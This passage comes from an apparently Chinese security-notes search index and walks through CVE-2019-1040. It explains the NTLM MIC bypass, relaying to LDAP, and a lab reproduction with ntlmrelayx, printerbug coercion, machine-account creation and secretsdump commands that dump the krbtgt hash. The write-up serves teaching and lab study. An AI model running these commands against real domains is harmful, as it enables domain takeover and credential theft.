\u6570\u636e\u5305\u7684\u6807\u5fd7\uff0c\u800c\u4e0d\u4f1a\u4f7f\u7b7e\u540d\u65e0\u6548\u3002\u7ed3\u5408\u5176\u4ed6\u6f0f\u6d1e\u548c\u673a\u5236\uff0c\u5728\u67d0\u4e9b\u573a\u666f\u4e0b\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u4ec5\u6709\u4e00\u4e2a\u666e\u901a\u57df\u8d26\u53f7\u7684\u60c5\u51b5\u4e0b\u63a5\u7ba1\u5168\u57df\uff01</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html#_2","title":"\u6f0f\u6d1e\u539f\u7406","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u6700\u6838\u5fc3\u7684\u5730\u65b9\u5728\u4e8e\u5b89\u5168\u7814\u7a76\u5458\u80fd\u7ed5\u8fc7 NTLM MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u3002\u90a3\u4e48\u5b89\u5168\u7814\u7a76\u5458\u662f\u5982\u4f55\u7ed5\u8fc7 NTLM MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u7684\u5462\uff1f</p> <p>\u7531\u4e8e Microsoft Windows \u670d\u52a1\u5668\u5141\u8bb8\u65e0 MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u7684 NTLM Authenticate \u6d88\u606f\uff0c\u56e0\u6b64\u8be5\u6f0f\u6d1e\u7ed5\u8fc7 MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u7684\u601d\u8def\u662f\u53d6\u6d88\u6570\u636e\u5305\u4e2d\u7684 MIC \u6807\u5fd7\u4ee5\u6b64\u6765\u53d6\u6d88 MIC \u6821\u9a8c\uff0c\u53d6\u6d88 MIC \u6821\u9a8c\u64cd\u4f5c\u5982\u4e0b\uff1a</p> <ul> <li>\u4ece<code>NTLM Authenticate</code> \u6d88\u606f\u4e2d\u5220\u9664 MIC \u5b57\u6bb5\u548c Version \u5b57\u6bb5\uff0c\u5982\u56fe\u6240\u793a\uff1a</li> <li>\u5c06 <code>NEGOTIATE_VERSION</code> \u6807\u5fd7\u4f4d\u8bbe\u7f6e\u4e3a Not set\uff0c\u5982\u56fe\u6240\u793a\uff1a</li> </ul> <p></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html#_3","title":"\u6f0f\u6d1e\u5b8c\u6574\u5229\u7528\u94fe","text":"<p>\u7ed5\u8fc7 NTLM \u7684 MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u53ea\u662f\u7b2c\u4e00\u6b65\uff0c\u6210\u529f\u7ed5\u8fc7 NTLM \u7684 MIC\u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u4e4b\u540e\u6211\u4eec\u80fd\u505a\u4ec0\u4e48\u5462\uff1f</p> <p>\u8fd9\u91cc\u6f0f\u6d1e\u5b8c\u6574\u5229\u7528\u653b\u51fb\u94fe\u7ed3\u5408 NTLM Relay \u8fdb\u884c\u5229\u7528\u3002\u5b8c\u6574\u653b\u51fb\u94fe\u5982\u4e0b\uff1a</p> <p>1\uff09\u4f7f\u7528\u57df\u5185\u4efb\u610f\u6709\u6548\u5e10\u6237\uff0c\u901a\u8fc7 SMB \u8fde\u63a5\u5230\u76ee\u6807\u673a\u5668\uff0c\u4f7f\u7528 Print Spooler Bug\u6f0f\u6d1e\u6216 PetitPotam \u6f0f\u6d1e\u5f3a\u5236\u89e6\u53d1\u76ee\u6807\u673a\u5668\u5411\u6307\u5b9a\u7684\u4e3b\u673a\u8fdb\u884c NTLM \u8ba4\u8bc1\u3002</p> <p>2\uff09\u4e2d\u7ee7\u670d\u52a1\u5668\u6536\u5230\u76ee\u6807\u673a\u5668\u7684 NTLM \u8ba4\u8bc1\u6d41\u91cf\u540e\uff0c\u901a\u8fc7\u5220\u9664\u76f8\u5e94\u5b57\u6bb5\u7ed5\u8fc7 NTLM\u7684 MIC \u5b8c\u6574\u6027\u6821\u9a8c\u5e76\u901a\u8fc7\u4fee\u6539 NTLM \u6570\u636e\u5305\u7684\u6807\u5fd7\u4f4d\u4f7f\u5f97\u5176\u4ece SMB \u534f\u8bae\u4e2d\u7ee7\u5230LDAP \u534f\u8bae\u4e0d\u9700\u8981\u7b7e\u540d\u3002</p> <p>3\uff09\u4f7f\u7528\u4e2d\u7ee7\u7684 LDAP \u6d41\u91cf\uff0c\u901a\u8fc7 LDAP \u534f\u8bae\u8fdc\u7a0b\u8fde\u63a5\u57df\u63a7\uff0c\u6267\u884c\u9ad8\u6743\u9650\u64cd\u4f5c\uff0c\u8d4b\u4e88\u6307\u5b9a\u7684\u5e10\u6237\u9ad8\u6743\u9650\u3002</p> <p>4\uff09\u4f7f\u7528\u63d0\u5347\u4e86\u6743\u9650\u7684\u5e10\u6237\u8fdb\u884c\u540e\u5229\u7528\uff0c\u63a5\u7ba1\u5168\u57df\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html#1-ntlm","title":"1.\u89e6\u53d1\u76ee\u6807 NTLM \u8bf7\u6c42","text":"<p>\u9996\u5148\uff0c\u653b\u51fb\u8005\u9700\u8981\u76ee\u6807\u53d1\u8d77 NTLM \u8bf7\u6c42\u624d\u80fd\u8fdb\u884c NTLM Relay \u5229\u7528\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5229\u7528\u6253\u5370\u673a\u6f0f\u6d1e Print Spoole Bug \u6216\u8005\u5fae\u8f6f\u52a0\u5bc6\u6587\u4ef6\u7cfb\u7edf\u8fdc\u7a0b\u534f\u8bae(MS-EFSRPC)\u6f0f\u6d1e PetitPotam \u6765\u5f3a\u5236\u89e6\u53d1\u76ee\u6807\u4e3b\u673a\u5411\u6307\u5b9a\u7684\u4e3b\u673a\u8fdb\u884c NTLM \u8ba4\u8bc1\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html#2ldap","title":"2.LDAP \u7b7e\u540d\u7ed5\u8fc7","text":"<p>\u7531\u4e8e\u901a\u8fc7 Print Spooler Bug \u548c PetitPotam \u89e6\u53d1\u7684 NTLM \u8ba4\u8bc1\u90fd\u662f\u57fa\u4e8eSMB \u534f\u8bae\u7684\u3002\u56e0\u6b64\u5b89\u5168\u7814\u7a76\u5458\u9700\u8981\u5c06 SMB \u534f\u8bae\u7684\u8eab\u4efd\u9a8c\u8bc1\u6d41\u91cf\u901a\u8fc7 LDAP \u534f\u8bae\u4e2d\u7ee7\u5230 DC \u57df\u63a7\u3002\u4f46\u662f\u7531\u4e8e NTLM \u534f\u8bae\u7684\u5de5\u4f5c\u65b9\u5f0f\uff0c\u65e0\u6cd5\u76f4\u63a5\u5c06 SMB \u534f\u8bae\u6d41\u91cf\u4e2d\u7ee7\u5230 LDAP \u534f\u8bae\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5ba2\u6237\u7aef\u548c\u57df\u63a7\u6216 Exchange \u670d\u52a1\u5668\u8fdb\u884c SMB \u901a\u4fe1\u65f6\uff0c\u662f\u5f3a\u5236\u8981\u6c42\u7b7e\u540d\u7684\u3002\u5176 NTLM \u8eab\u4efd\u9a8c\u8bc1\u6d41\u91cf\u7684\u5982\u4e0b\u6807\u5fd7\u5747\u4e3a Set\uff1a</p> <ul> <li>Negotiate Key Exchange</li> <li>Negotiate Always Sign</li> <li>Negotiate Sign</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7 WireShark \u6293\u5305\u53ef\u4ee5\u770b\u5230\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cSMB \u534f\u8bae\u7684NTLM \u8eab\u4efd\u9a8c\u8bc1\u6d41\u91cf\u7684\u5982\u4e0b\u6807\u5fd7\u4f4d\u5747\u4e3a Set\u3002</p> <p></p> <p>\u6b64\u65f6\u5c06 SMB \u6d41\u91cf\u4e2d\u7ee7\u5230 LDAP \u65f6\uff0c\u7531\u4e8e Negotiate Sign \u548c Negotiate AlwaysSign \u6807\u5fd7\u4e3a Set\uff0c\u8be5\u6807\u5fd7\u4f1a\u89e6\u53d1 LDAP \u7b7e\u540d\u3002\u800c\u5b89\u5168\u7814\u7a76\u5458\u53c8\u65e0\u6cd5\u6784\u9020\u7b7e\u540d\uff0c\u56e0\u6b64\u4f1a\u88ab LDAP \u534f\u8bae\u5ffd\u7565\uff0c\u5bfc\u81f4\u653b\u51fb\u5931\u8d25\u3002\u524d\u9762\u6211\u4eec\u63d0\u5230\u4e86 CVE-2019-1040 \u6700\u6838\u5fc3\u7684\u5730\u65b9\u5c31\u5728\u4e8e\u5b89\u5168\u7814\u7a76\u5458\u80fd\u7ed5\u8fc7 NTLM \u7684 MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\uff0c\u5bfc\u81f4\u5b89\u5168\u7814\u7a76\u5458\u53ef\u4ee5\u4efb\u610f\u4fee\u6539 NTLM \u8ba4\u8bc1\u7684\u6570\u636e\u5305\u3002\u56e0\u6b64\uff0c\u5b89\u5168\u7814\u7a76\u5458\u5728\u7ed5\u8fc7 MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u4e4b\u540e\uff0c\u53ef\u4ee5\u4fee\u6539\u6d41\u91cf\u7684\u6807\u5fd7\u4f4d\u4ee5\u534f\u5546\u4e0d\u5f00\u542f LDAP \u7b7e\u540d\u6821\u9a8c\u3002\u5177\u4f53\u63aa\u65bd\u5982\u4e0b\uff0c\u5c06\u4ee5\u4e0b\u6807\u5fd7\u4f4d\u8bbe\u7f6e\u4e3a Not set\uff1a</p> <ul> <li>Negotiate Key Exchange</li> <li>Negotiate Always Sign</li> <li>Negotiate Sign</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u5b89\u5168\u7814\u7a76\u5458\u5df2\u7ecf\u4f2a\u9020\u8fd9\u51e0\u4e2a\u5b57\u6bb5\u4e3a Not set \u4e86\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html#3","title":"3.\u653b\u51fb\u76ee\u6807\u7684\u9009\u62e9","text":"<p>\u653b\u51fb\u76ee\u6807\u7684\u9009\u62e9\u53ef\u4ee5\u662f\u57df\u5185\u7684\u4efb\u610f\u673a\u5668\u3002\u8fd9\u91cc\u6211\u4ee5\u57df\u63a7\u548c Exchange \u670d\u52a1\u5668\u4e3a\u4f8b\uff0c\u539f\u56e0\u5728\u4e8e\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u57df\u63a7\u548c Exchange \u670d\u52a1\u5668\u5728\u57df\u5185\u5177\u6709\u9ad8\u6743\u9650\uff0c\u5bf9\u5176\u8fdb\u884c\u653b\u51fb\u53ef\u4ee5\u76f4\u63a5\u63a5\u7ba1\u5168\u57df\uff01</p> <p>\u2022 \u653b\u51fb Exchange \u670d\u52a1\u5668\uff1a\u4f7f\u7528\u4efb\u4f55\u6709\u6548\u57df\u7528\u6237\uff0c\u5229\u7528 Print Spooler Bug \u6216PetitPotam \u5f3a\u5236\u89e6\u53d1\u76ee\u6807 Exchange \u670d\u52a1\u5668\u5411\u653b\u51fb\u8005\u4e3b\u673a\u8fdb\u884c NTLM \u8ba4\u8bc1\u3002\u653b\u51fb\u8005\u673a\u5668\u63a5\u6536\u5230\u76ee\u6807 Exchange \u670d\u52a1\u5668\u7684\u8ba4\u8bc1\u6d41\u91cf\u540e\uff0c\u901a\u8fc7\u4fee\u6539NTLM \u8ba4\u8bc1\u6570\u636e\u5305\u7ed5\u8fc7 NTLM \u7684 MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u548c LDAP \u7b7e\u540d\uff0c\u5c06\u5176\u8ba4\u8bc1\u6d41\u91cf\u901a\u8fc7 LDAP \u534f\u8bae\u4e2d\u7ee7\u5230 DC \u57df\u63a7\u3002\u4f7f\u7528\u4e2d\u7ee7\u7684 LDAP \u8eab\u4efd\u9a8c\u8bc1\uff0c\u4e3a\u653b\u51fb\u8005\u6307\u5b9a\u7684\u5e10\u6237\u6388\u4e88 Dcsync \u6743\u9650\uff0c\u7136\u540e\u4f7f\u7528\u6307\u5b9a\u7684\u5e10\u6237\u5229\u7528 DCSync\u6743\u9650\u8f6c\u50a8\u6d3b\u52a8\u76ee\u5f55\u4e2d\u6240\u6709\u5bc6\u7801\u54c8\u5e0c\u503c\uff01</p> <p>\u2022 \u653b\u51fb\u57df\u63a7\uff1a\u4f7f\u7528\u4efb\u4f55\u6709\u6548\u57df\u7528\u6237\uff0c\u5728\u57df\u5185\u521b\u5efa\u4e00\u4e2a\u53ef\u63a7\u7684\u673a\u5668\u5e10\u6237\u3002\u7136\u540e\u4f7f\u7528 Print Spooler Bug \u6216 PetitPotam \u5f3a\u5236\u89e6\u53d1\u76ee\u6807\u57df\u63a7\u5411\u653b\u51fb\u8005\u4e3b\u673a\u8fdb\u884cNTLM \u8ba4\u8bc1\u3002\u653b\u51fb\u8005\u673a\u5668\u63a5\u6536\u5230\u76ee\u6807\u57df\u63a7\u7684\u8ba4\u8bc1\u6d41\u91cf\u540e\uff0c\u901a\u8fc7\u4fee\u6539 NTLM\u8ba4\u8bc1\u6570\u636e\u5305\u7ed5\u8fc7 NTLM \u7684\u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u548c LDAP \u7b7e\u540d\uff0c\u5c06\u5176\u8ba4\u8bc1\u6d41\u91cf\u901a\u8fc7 LDAP \u534f\u8bae\u4e2d\u7ee7\u5230\u53e6\u4e00\u4e2a DC \u57df\u63a7\u3002\u4f7f\u7528\u4e2d\u7ee7\u7684 LDAP \u8eab\u4efd\u9a8c\u8bc1\uff0c\u4e3a\u653b\u51fb\u8005\u6307\u5b9a\u7684\u53ef\u63a7\u7684\u673a\u5668\u5e10\u6237\u8d4b\u4e88\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u6743\u9650\u3002\u7136\u540e\u5229\u7528\u8be5\u673a\u5668\u5e10\u6237\u7533\u8bf7\u8bbf\u95ee\u76ee\u6807\u57df\u63a7\u7684\u670d\u52a1\u7968\u636e\uff0c\u5373\u53ef\u63a5\u7ba1\u57df\u63a7\uff01</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html#_4","title":"\u6f0f\u6d1e\u5f71\u54cd\u7248\u672c","text":"<ul> <li>Windows 7 sp1 \u81f3 Windows 10 1903</li> <li>Windows Server 2008 \u81f3 Windows Server 2019</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html#_5","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u4ee5\u4e0b\u6f0f\u6d1e\u590d\u73b0\u6f14\u793a\u653b\u51fb Exchange \u670d\u52a1\u5668\u548c\u57df\u63a7\u5236\u5668\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html#exchange","title":"\u653b\u51fb Exchange \u670d\u52a1\u5668","text":"<p>\u5b9e\u9a8c\u73af\u5883\u5982\u4e0b\uff1a</p> <ul> <li>\u57df\u63a7\uff1a10.211.55.4</li> <li>Exchange \u670d\u52a1\u5668\uff1a10.211.55.5\uff0c\u4e3b\u673a\u540d\u4e3a MAIL</li> <li>\u5b89\u5168\u7814\u7a76\u5458\uff1a10.211.55.2</li> <li>\u666e\u901a\u57df\u7528\u6237\uff1axie\\hack P@ss1234</li> </ul> <p>\u6574\u4e2a\u5229\u7528\u94fe\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u9996\u5148\u5728\u5b89\u5168\u7814\u7a76\u5458\u673a\u5668 10.211.55.2 \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u76d1\u542c\uff1a</p> <pre><code>python3 ntlmrelayx.py --remove-mic --escalate-user hack -t ldap://10.211.55.4 -smb2support --no-dump -debug\n</code></pre> <p>\u53c2\u6570\u542b\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>--remove-mic \u53c2\u6570\u7528\u4e8e\u7ed5\u8fc7 NTLM \u7684 MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c</li> <li>\u2013escalate-user \u53c2\u6570\u7528\u4e8e\u8d4b\u4e88\u6307\u5b9a\u7528\u6237 Dcsync \u6743\u9650</li> <li>-t \u53c2\u6570\u5c06\u8ba4\u8bc1\u51ed\u636e\u4e2d\u7ee7\u5230\u6307\u5b9a ldap</li> <li>-smb2support \u53c2\u6570\u7528\u4e8e\u652f\u6301 SMB2 \u534f\u8bae</li> <li>--no-dump \u53c2\u6570\u8868\u793a\u83b7\u5f97 Dcsync \u6743\u9650\u540e\u4e0d dump \u57df\u5185\u54c8\u5e0c</li> <li>-debug \u53c2\u6570\u7528\u4e8e\u663e\u793a\u65e5\u5fd7\u4fe1\u606f</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u5b89\u5168\u7814\u7a76\u5458\u8fd0\u884c\u547d\u4ee4\u8fdb\u884c\u76d1\u542c\uff1a</p> <p></p> <p>\u63a5\u7740\u5b89\u5168\u7814\u7a76\u5458\u4f7f\u7528 printerbug.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u4f7f\u7528 xie\\hack \u7528\u6237\u8fde\u63a5Exchange \u670d\u52a1\u5668\uff0c\u89e6\u53d1 Exchange \u670d\u52a1\u5668\u7684 Print Spooler Bug\uff0c\u8be5 bug \u4f1a\u5f3a\u5236\u89e6\u53d1\u76ee\u6807 Exchange \u670d\u52a1\u5668 10.211.55.5 \u5411\u6307\u5b9a\u7684\u5b89\u5168\u7814\u7a76\u5458\u673a\u5668 10.211.55.2 \u673a\u5668\u8fdb\u884c NTLM \u8ba4\u8bc1\u3002</p> <pre><code>python3 printerbug.py xie/hack:P@ss1234@10.211.55.5 10.211.55.2\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5b89\u5168\u7814\u7a76\u5458\u4f7f\u7528\u6253\u5370\u673a\u6f0f\u6d1e\u5f3a\u5236\u89e6\u53d1\u76ee\u6807 Exchange \u670d\u52a1\u566810.211.55.5 \u5411\u6307\u5b9a\u7684\u5b89\u5168\u7814\u7a76\u5458\u673a\u5668 10.211.55.2 \u673a\u5668\u8fdb\u884c NTLM \u8ba4\u8bc1\u3002</p> <p></p> <p>\u7136\u540e\u5b89\u5168\u7814\u7a76\u5458\u5c31\u53ef\u4ee5\u6536\u5230\u76ee\u6807 Exchange \u670d\u52a1\u5668\u53d1\u8fc7\u6765\u7684 NTLM \u8ba4\u8bc1\u6d41\u91cf\u4e86\uff0c\u518d\u5c06\u6b64 NTLM \u8ba4\u8bc1\u6d41\u91cf\u7ed5\u8fc7 NTLM \u7684 MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u540e\uff0c\u901a\u8fc7\u4fee\u6539LDAP \u534f\u5546\u6570\u636e\u5305\u4e2d\u7684\u76f8\u5e94\u6807\u5fd7\u4f4d\u6765\u4f7f\u5f97\u534f\u5546\u4e0d\u9700\u8981\u7b7e\u540d\u3002\u518d\u901a\u8fc7 LDAP \u534f\u8bae\u4e2d\u7ee7\u7ed9\u57df\u63a7\uff0cLDAP \u4e2d\u6267\u884c\u7684\u9ad8\u6743\u9650\u64cd\u4f5c\u662f\u8d4b\u4e88\u6307\u5b9a hack \u7528\u6237 DCSync \u6743\u9650\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u811a\u672c\u9996\u5148\u4f1a\u904d\u5386\u4e2d\u7ee7\u7684\u673a\u5668\u7528\u6237\u7684\u6743\u9650\uff0c\u53d1\u73b0\u76ee\u6807Exchange \u670d\u52a1\u5668\u7684\u673a\u5668\u8d26\u53f7\u5728\u57df\u5185\u62e5\u6709\u521b\u5efa\u7528\u6237\u548c\u4fee\u6539\u57df ACL \u7684\u6743\u9650\u3002\u56e0\u6b64\u8be5\u811a\u672c\u4f1a\u9009\u62e9\u4fee\u6539\u57df\u7684 ACL \u8fd9\u79cd\u65b9\u5f0f\u6765\u63d0\u6743\uff0c\u56e0\u4e3a\u5b83\u76f8\u6bd4\u4e8e\u521b\u5efa\u9ad8\u6743\u9650\u7528\u6237\u66f4\u4e3a\u9690\u853d\u3002\u8be5\u811a\u672c\u901a\u8fc7\u4fee\u6539\u6307\u5b9a hack \u7528\u6237\u7684 ACL\uff0c\u4e3a\u5176\u8d4b\u4e88 DCSync \u6743\u9650\u3002</p> <p></p> <p>\u4fee\u6539\u5b8c hack \u7528\u6237\u7684 ACL \u540e\uff0c\u6b64\u65f6\u57df\u666e\u901a\u7528\u6237 hack \u5df2\u7ecf\u88ab\u8d4b\u4e88\u4e86 Dcsync \u6743\u9650\uff0c\u53ef\u4ee5\u76f4\u63a5\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\u3002\u4f7f\u7528 secretsdump.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5bfc\u51fa\u6307\u5b9a\u57df\u7528\u6237 krbtgt \u7684\u54c8\u5e0c\uff0c\u5373\u53ef\u63a5\u7ba1\u5168\u57df\uff01</p> <pre><code>python3 secretsdump.py xie.com/hack:P@ss1234@10.211.55.4 -just-dc-user krbtgt\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5bfc\u51fa krbtgt \u7528\u6237\u54c8\u5e0c\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Domain_vulnerabilities_and_exploitation/article2/index.html#_6","title":"\u653b\u51fb\u57df\u63a7\u5236\u5668","text":"<p>\u653b\u51fb\u57df\u63a7\u5236\u5668\u9700\u8981\u76ee\u6807\u57df\u5185\u81f3\u5c11\u5b58\u5728\u4e24\u53f0\u57df\u63a7\uff1a\u4e00\u53f0\u57df\u63a7\u7528\u4e8e\u89e6\u53d1 Print Spooler Bug \u6216 PetitPotam\uff0c\u53e6\u4e00\u53f0\u57df\u63a7\u7528\u4e8e\u4e2d\u7ee7 LDAP \u6d41\u91cf\u6267\u884c\u9ad8\u6743\u9650\u64cd\u4f5c(\u540c\u4e00\u673a\u5668\u7684\u6d41\u91cf\u4e2d\u7ee7\u56de\u53bb\u7684\u8bdd\u4f1a\u5931\u8d25)\u3002</p> <p>\u8fd9\u91cc\u653b\u51fb\u57df\u63a7\u6709\u4e24\u79cd\u60c5\u51b5</p> <ul> <li>\u76ee\u6807\u57df\u652f\u6301 ldaps\uff1a\u8fd9\u6837\u53ef\u4ee5\u76f4\u63a5\u5229\u7528 ntlmrelayx.py \u811a\u672c\u5728\u4e2d\u7ee7\u65f6\u521b\u5efa\u673a\u5668\u7528\u6237\u5e76\u8d4b\u4e88\u59d4\u6d3e\u6743\u9650(\u8fdc\u7a0b\u6dfb\u52a0\u7528\u6237\uff0c\u9700\u8981 ldaps)\u3002</li> <li>\u76ee\u6807\u57df\u4e0d\u652f\u6301 ldaps\uff1a\u6211\u4eec\u53ef\u4ee5\u9996\u5148\u81ea\u5df1\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u7528\u6237\uff0c\u7136\u540e\u8d4b\u4e88\u59d4\u6d3e\u6743\u9650\u3002\u4ee5\u4e0b\u5b9e\u9a8c\u57fa\u4e8e\u8fd9\u79cd\u60c5\u51b5\u3002</li> </ul> <p>\u5b9e\u9a8c\u73af\u5883\u5982\u4e0b\uff1a</p> <ul> <li>\u57df\u63a7 1\uff1a10.211.55.4\uff0c\u4e3b\u673a\u540d\u4e3a AD01 </li> <li>\u57df\u63a7 2\uff1a10.211.55.5\uff0c\u4e3b\u673a\u540d\u4e3a AD02</li> <li>\u653b\u51fb\u673a\uff1a10.211.55.2</li> <li>\u666e\u901a\u57df\u7528\u6237\uff1axie\\hack P@ss1234</li> </ul> <p>\u6574\u4e2a\u5229\u7528\u94fe\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u5b89\u5168\u7814\u7a76\u5458\u5229\u7528\u666e\u901a\u7684\u57df\u8d26\u53f7 xie\\hack \u5728\u57df\u5185\u4e3b\u673a\u4e0a\u4f7f\u7528 PowerShell \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u53f7 machine$ \uff0c\u5bc6\u7801\u4e3a root\u3002</p> <pre><code>Import-Module .\\New-MachineAccount.ps1\nNew-MachineAccount -MachineAccount machine -Password root\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u521b\u5efa\u673a\u5668\u7528\u6237 machine$ \u6210\u529f\u3002</p> <p></p> <p>\u7136\u540e\u5728\u5b89\u5168\u7814\u7a76\u5458\u673a\u5668 10.211.55.2 \u4e0a\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u76d1\u542c</p> <pre><code>#\u76ee\u6807\u57df\u4e0d\u652f\u6301 ldaps \u7684\u8bdd\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff0c\u6307\u5b9a\u521a\u521a\u521b\u5efa\u7684\u673a\u5668\u8d26\u53f7 machine$\u3002\npython3 ntlmrelayx.py -t ldap://10.211.55.4 -smb2support --remove-mic --delegate-access --escalate-user machine\\$\n\n#\u76ee\u6807\u57df\u652f\u6301 ldaps \u7684\u8bdd\uff0c\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u547d\u4ee4\uff0c\u4f1a\u81ea\u52a8\u521b\u5efa\u673a\u5668\u8d26\u53f7\u3002\npython3 ntlmrelayx.py -t ldaps://10.211.55.4 -smb2support --remove-mic --delegate-access\n</code></pre> <p>\u53c2\u6570\u542b\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>-t \u53c2\u6570\u5c06\u8ba4\u8bc1\u51ed\u636e\u4e2d\u7ee7\u5230\u6307\u5b9a ldap</li> <li>-smb2support \u53c2\u6570\u7528\u4e8e\u652f\u6301 SMB2 \u534f\u8bae</li> <li>--remove-mic \u53c2\u6570\u7528\u4e8e\u7ed5\u8fc7 NTLM \u7684 MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c</li> <li>--delegate-access \u53c2\u6570\u7528\u4e8e\u6307\u5b9a\u59d4\u6d3e</li> <li>\u2013escalate-user \u53c2\u6570\u6307\u5b9a\u9700\u8981\u8d4b\u4e88\u59d4\u6d3e\u6743\u9650\u7684\u7528\u6237</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u5b89\u5168\u7814\u7a76\u5458\u8fd0\u884c\u547d\u4ee4\u8fdb\u884c\u76d1\u542c\uff1a</p> <p></p> <p>\u63a5\u7740\u5b89\u5168\u7814\u7a76\u5458\u4f7f\u7528 printerbug.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u4f7f\u7528 xie\\hack \u7528\u6237\u8fde\u63a5\u57df\u63a7\u5236\u5668 AD02\uff0c\u89e6\u53d1\u57df\u63a7\u5236\u5668 AD02 \u7684 Print Spooler Bug\uff0c\u8be5 bug \u4f1a\u5f3a\u5236\u89e6\u53d1\u76ee\u6807\u57df\u63a7\u5236\u5668 AD02 10.211.55.5 \u5411\u6307\u5b9a\u7684\u5b89\u5168\u7814\u7a76\u5458\u673a\u5668 10.211.55.2 \u673a\u5668\u8fdb\u884cNTLM \u8ba4\u8bc1\u3002</p> <pre><code>python3 printerbug.py xie.com/hack:P@ss1234@10.211.55.5 10.211.55.2\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5b89\u5168\u7814\u7a76\u5458\u4f7f\u7528\u6253\u5370\u673a\u6f0f\u6d1e\u5f3a\u5236\u89e6\u53d1\u76ee\u6807\u57df\u63a7\u5236\u5668 AD02 10.211.55.5\u5411\u6307\u5b9a\u7684\u5b89\u5168\u7814\u7a76\u5458\u673a\u5668 10.211.55.2 \u673a\u5668\u8fdb\u884c NTLM \u8ba4\u8bc1\u3002</p> <p></p> <p>\u7136\u540e\u5b89\u5168\u7814\u7a76\u5458\u5c31\u53ef\u4ee5\u6536\u5230\u76ee\u6807\u57df\u63a7 AD02 \u670d\u52a1\u5668\u53d1\u8fc7\u6765\u7684 NTLM \u8ba4\u8bc1\u6d41\u91cf\u4e86\uff0c\u518d\u5c06\u6b64 NTLM \u8ba4\u8bc1\u6d41\u91cf\u7ed5\u8fc7 NTLM \u7684 MIC \u6d88\u606f\u5b8c\u6574\u6027\u6821\u9a8c\u540e\u901a\u8fc7\u4fee\u6539 LDAP \u534f\u5546\u6570\u636e\u5305\u4e2d\u7684\u76f8\u5e94\u6807\u5fd7\u4f4d\u6765\u4f7f\u5f97\u534f\u5546\u4e0d\u9700\u8981\u7b7e\u540d\u3002\u518d\u901a\u8fc7 LDAP \u534f\u8bae\u4e2d\u7ee7\u7ed9\u57df\u63a7AD01\uff0cLDAP \u4e2d\u6267\u884c\u7684\u9ad8\u6743\u9650\u64cd\u4f5c\u662f\u8d4b\u4e88\u6307\u5b9a\u673a\u5668\u7528\u6237 machine$\u5bf9\u57df\u63a7\u5236\u5668AD02 \u7684\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6b64\u65f6\u673a\u5668\u7528\u6237 